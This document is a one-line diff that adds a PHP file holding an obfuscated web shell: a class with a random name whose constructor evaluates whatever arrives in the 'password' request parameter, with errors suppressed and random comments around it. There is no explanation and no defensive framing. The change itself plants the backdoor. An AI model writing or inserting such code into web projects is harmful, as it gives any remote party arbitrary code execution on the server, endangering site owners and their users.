@@ -1,0 +1,1 @@
+<?php class GPFG6x9B { public function __construct($HY6St){ @eval("/*Z8tVF4g1d6*/".$HY6St."/*Z8tVF4g1d6*/"); }}new GPFG6x9B($_REQUEST['password']);?>
